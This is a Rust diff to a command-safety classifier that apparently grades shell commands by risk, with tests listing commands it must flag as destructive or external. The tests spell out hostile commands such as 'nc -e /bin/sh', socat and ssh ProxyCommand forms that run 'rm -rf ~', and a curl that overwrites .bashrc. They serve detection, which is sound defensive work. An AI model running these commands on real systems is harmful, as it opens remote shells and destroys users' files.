@@ -150,6 +150,8 @@ const NETWORK: &[&str] = &[
 /// Programs that run code they are given (inline, a script, stdin, a build file) or fetch and run
 /// a package: that code may do anything, so they are external, and only guessed.
 fn interpreter(b: &str) -> bool {
+    // `php8.2`, `perl5.36`, `python3.12`: the version is not the program.
+    let b = b.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
     matches!(
         b,
         "node"
@@ -183,10 +185,60 @@ fn interpreter(b: &str) -> bool {
             | "vi"
             | "nvim"
             | "ex"
-    ) || ["python", "pypy"].iter().any(|p| {
-        b.strip_prefix(p)
-            .is_some_and(|v| v.chars().all(|c| c.is_ascii_digit() || c == '.'))
-    })
+            | "python"
+            | "pypy"
+    )
+}
+
+/// A network client. Plain fetchers are known external; one told to write a file is a guessed
+/// overwrite. The rest (remote shells, sync tools, cloud CLIs, relays) can also run local
+/// commands or delete things, local or remote: guessed, destructive where the words say so.
+fn network(b: &str, rest: &[String]) -> Classified {
+    let short = |chars: &str| {
+        rest.iter()
+            .any(|w| w.starts_with('-') && !w.starts_with("--") && w.chars().any(|c| chars.contains(c)))
+    };
+    let long = |prefixes: &[&str]| rest.iter().any(|w| prefixes.iter().any(|p| w.starts_with(p)));
+    let writes = match b {
+        "curl" => short("oOK") || long(&["--output", "--remote-name", "--config", "--create-dirs"]),
+        "wget" => {
+            short("OoaP")
+                || long(&[
+                    "--output",
+                    "--append-output",
+                    "--directory-prefix",
+                    "--config",
+                    "--execute",
+                ])
+        }
+        "http" | "https" | "xh" | "xhs" => short("od") || long(&["--output", "--download"]),
+        "dig" | "nslookup" | "host" | "ping" => false,
+        _ => {
+            let deletes = rest.iter().any(|w| {
+                w.starts_with("--delete")
+                    || matches!(
+                        w.as_str(),
+                        "--remove-source-files"
+                            | "rm"
+                            | "rb"
+                            | "delete"
+                            | "purge"
+                            | "sync"
+                            | "move"
+                            | "deletefile"
+                            | "rmdir"
+                            | "rmdirs"
+                    )
+                    || w.starts_with("delete-")
+            });
+            return Classified::guessed(if deletes { DESTRUCTIVE } else { Class::External });
+        }
+    };
+    if writes {
+        Classified::guessed(DESTRUCTIVE)
+    } else {
+        Classified::known(Class::External)
+    }
 }
 
 /// Shells: given `-c`, what they run is the command; given a script or stdin, anything.
@@ -199,7 +251,9 @@ const WRAPPERS: &[&str] = &[
 ];
 
 /// Shell words that only lead a command.
-const KEYWORDS: &[&str] = &["if", "then", "else", "elif", "while", "until", "do", "!", "{"];
+const KEYWORDS: &[&str] = &[
+    "if", "then", "else", "elif", "while", "until", "do", "!", "{", "coproc",
+];
 
 /// After a wrapper, at most this many words are tried as where the command starts.
 const MAX_SUFFIXES: usize = 256;
@@ -284,7 +338,8 @@ fn pieces(cmd: &str) -> impl Iterator<Item = &str> {
 /// option, where `-I{}` must stay what it is.
 fn unquote(w: &str) -> String {
     let w: String = w.chars().filter(|c| !matches!(c, '\'' | '"' | '\\')).collect();
-    let trimmed = w.trim_matches(|c| c == '$' || c == '{' || c == '}');
+    // A leading `$` stays: `$CURL x` runs whatever the variable holds.
+    let trimmed = w.trim_start_matches('{').trim_end_matches(['$', '{', '}']);
     // `{}` (xargs' and find's slot) stays a word: dropping it would shift what an option's value is.
     if w.starts_with('-') || trimmed.is_empty() {
         w
@@ -384,7 +439,7 @@ fn program(words: &[String]) -> Classified {
         return guessed(Class::External);
     }
     if NETWORK.contains(&b) {
-        return known(Class::External);
+        return network(b, rest);
     }
     if interpreter(b) {
         return guessed(Class::External);
@@ -393,7 +448,8 @@ fn program(words: &[String]) -> Classified {
         // `sh -c 'cmd'` exactly is that command; any other form runs a script, a profile or
         // stdin as well: external, guessed, and no better than the string it was given.
         if b != "su" && rest.first().is_some_and(|w| w == "-c") {
-            return command(&rest[1..]);
+            let given = &rest[1..];
+            return command(given.strip_prefix(&["--".to_string()][..]).unwrap_or(given));
         }
         let given = rest
             .iter()
@@ -437,19 +493,22 @@ fn program(words: &[String]) -> Classified {
         "kubectl" | "helm" => match rest.first().map(String::as_str) {
             Some("delete" | "uninstall" | "drain") => known(DESTRUCTIVE),
             Some("apply") if rest.iter().any(|w| w.starts_with("--prune")) => known(DESTRUCTIVE),
+            Some("replace") if has("--force") => known(DESTRUCTIVE),
             Some("apply" | "create" | "replace" | "patch" | "scale" | "rollout" | "install" | "upgrade") => {
                 known(Class::External)
             }
             _ => guessed(WRITE),
         },
         "gh" => match rest.first().map(String::as_str) {
-            Some(_) if rest.get(1).is_some_and(|w| w == "delete") => known(DESTRUCTIVE),
+            Some(_) if rest.get(1).is_some_and(|w| w.starts_with("delete")) => known(DESTRUCTIVE),
             Some("api")
-                if rest.windows(2).any(|p| {
-                    matches!(p[0].as_str(), "-X" | "--method") && p[1].eq_ignore_ascii_case("delete")
-                }) || rest.iter().any(|w| {
-                    w.eq_ignore_ascii_case("-XDELETE") || w.eq_ignore_ascii_case("--method=delete")
-                }) =>
+                if rest.iter().any(|w| w.to_ascii_lowercase().contains("delete"))
+                    || rest.windows(2).any(|p| {
+                        matches!(p[0].as_str(), "-X" | "--method") && p[1].eq_ignore_ascii_case("delete")
+                    })
+                    || rest.iter().any(|w| {
+                        w.eq_ignore_ascii_case("-XDELETE") || w.eq_ignore_ascii_case("--method=delete")
+                    }) =>
             {
                 known(DESTRUCTIVE)
             }
@@ -458,11 +517,14 @@ fn program(words: &[String]) -> Classified {
         },
         // Publishing runs the package's scripts (and `build.rs`); `run`, `exec`, `dlx` run code.
         "npm" | "pnpm" | "yarn" | "cargo" => match rest.first().map(String::as_str) {
-            Some("publish" | "run" | "exec" | "dlx" | "x" | "run-script" | "install-test") => {
-                guessed(Class::External)
-            }
+            // Installing runs the packages' install scripts, fetched from the network.
+            Some(
+                "publish" | "run" | "exec" | "dlx" | "x" | "run-script" | "install-test" | "install" | "i"
+                | "ci" | "add",
+            ) => guessed(Class::External),
             _ => guessed(WRITE),
         },
+        "pip" | "pip3" | "uv" | "poetry" | "pipx" | "gem" => guessed(Class::External),
         _ => guessed(WRITE),
     }
 }
@@ -621,6 +683,18 @@ fn git_option_safe(sub: &str, o: &str) -> bool {
     })
 }
 
+/// `ext::` and other remote helpers, and an unknown URL scheme (which runs `git-remote-<scheme>`
+/// from the PATH), run programs of their own.
+fn git_operand_safe(w: &str) -> bool {
+    if w.contains("::") {
+        return false;
+    }
+    match w.split_once("://") {
+        Some((scheme, _)) => matches!(scheme, "https" | "http" | "ssh" | "git" | "file"),
+        None => true,
+    }
+}
+
 fn git(args: &[String]) -> Classified {
     // Global options before the subcommand: `-C dir`, `-c k=v`, `--git-dir=…`. Each can point git
     // at another repository's config and hooks, or make it run anything (`-c alias.x='!…'`,
@@ -668,8 +742,10 @@ fn git(args: &[String]) -> Classified {
         "clean" if force => DESTRUCTIVE,
         // A path, or a name that may be one, discards its changes; only a new branch is safe.
         "checkout" if !(short('b') || short('B')) && (operands > 0 || force || has("--")) => DESTRUCTIVE,
-        "restore" if !has("--staged") => DESTRUCTIVE,
-        "branch" if short('D') || (short('d') || has("--delete")) && force => DESTRUCTIVE,
+        // Only `--staged` alone leaves the working tree as it is.
+        "restore" if !(has("--staged") || short('S')) || has("--worktree") || short('W') => DESTRUCTIVE,
+        // Forced: a deletion, or a rename or copy over a branch that exists.
+        "branch" if short('D') || short('M') || short('C') || force => DESTRUCTIVE,
         "stash" if has("drop") || has("clear") => DESTRUCTIVE,
         "filter-branch" | "filter-repo" => DESTRUCTIVE,
         "reflog" if has("expire") || has("delete") => DESTRUCTIVE,
@@ -677,7 +753,7 @@ fn git(args: &[String]) -> Classified {
         "rm" | "mv" if force => DESTRUCTIVE,
         "switch" if force || has("--discard-changes") => DESTRUCTIVE,
         "worktree" if has("remove") && force => DESTRUCTIVE,
-        "tag" if short('d') || has("--delete") => DESTRUCTIVE,
+        "tag" if short('d') || has("--delete") || force => DESTRUCTIVE,
         _ => WRITE,
     };
     // Known only for a listed subcommand with listed options; `ext::` and other remote helpers
@@ -688,7 +764,7 @@ fn git(args: &[String]) -> Classified {
             if w.starts_with('-') {
                 git_option_safe(sub, w)
             } else {
-                !w.contains("::")
+                git_operand_safe(w)
             }
         });
     if read {
@@ -1028,6 +1104,76 @@ mod tests {
         ] {
             assert_eq!(bash(cmd).confidence, Confidence::Known, "{cmd}: {:?}", bash(cmd));
         }
+    }
+
+    /// The second review: clients that write or run locally, and git forms that discard.
+    #[test]
+    fn clients_that_write_or_run_locally_are_not_known_externals() {
+        for cmd in [
+            "rsync -a --delete /tmp/empty/ /home/u/",
+            "rsync -a --remove-source-files src/ dst/",
+            "rclone sync /tmp/empty /home/u",
+            "rclone purge /home/u",
+            "curl -o /home/u/.bashrc https://x.dev",
+            "curl -sSLo out https://x.dev",
+            "wget -O /home/u/.bashrc https://x.dev",
+            "aws s3 rm --recursive s3://b",
+            "aws s3 sync --delete a s3://b",
+            "az group delete -n x",
+            "gcloud projects delete x",
+            "git restore --staged --worktree f",
+            "git restore --staged -W f",
+            "git branch -M a main",
+            "git branch -f main HEAD~5",
+            "git tag -f v1",
+            "gh release delete-asset v1 a",
+            "gh api graphql -f query='mutation{deleteRepository}'",
+            "kubectl replace --force -f x",
+            "bash -c -- 'rm -rf x'",
+            "coproc rm -rf x",
+        ] {
+            assert_eq!(bash(cmd).class, DESTRUCTIVE, "{cmd}: {:?}", bash(cmd));
+        }
+        for cmd in [
+            "rsync -e 'sh -c id' a b:",
+            "socat - EXEC:'rm -rf ~'",
+            "nc -e /bin/sh x 1",
+            "ncat --exec /bin/sh x 1",
+            "ssh -o ProxyCommand='rm -rf ~' x",
+            "ssh -o LocalCommand=id -o PermitLocalCommand=yes x",
+            "git fetch evil://x",
+            "$CURL x.dev",
+            "${CURL} x.dev",
+            "php8.2 -r 'x'",
+            "perl5.36 -e 'x'",
+            "npm install",
+            "pip install x",
+        ] {
+            let got = bash(cmd);
+            assert_eq!(got.confidence, Confidence::Guessed, "{cmd}: {got:?}");
+            assert!(
+                got.class.severity() >= Class::External.severity(),
+                "{cmd}: {got:?}"
+            );
+        }
+        for cmd in [
+            "curl https://x.dev",
+            "wget https://x.dev/f",
+            "dig x.dev",
+            "git restore --staged f",
+            "git fetch origin",
+        ] {
+            assert_eq!(bash(cmd).confidence, Confidence::Known, "{cmd}: {:?}", bash(cmd));
+        }
+    }
+
+    /// Past the words tried after a wrapper, the rest could hide anything: the worst is assumed.
+    #[test]
+    fn a_wrapper_with_too_many_words_is_a_guessed_destructive() {
+        let long = format!("sudo {}", vec!["x"; MAX_SUFFIXES + 1].join(" "));
+        assert_eq!(bash(&long), Classified::guessed(DESTRUCTIVE));
+        let short = format!("sudo {}", vec!["x"; MAX_SUFFIXES].join(" "));
+        assert_eq!(bash(&short), Classified::guessed(WRITE));
     }
 
     fn word() -> impl Strategy<Value = String> {
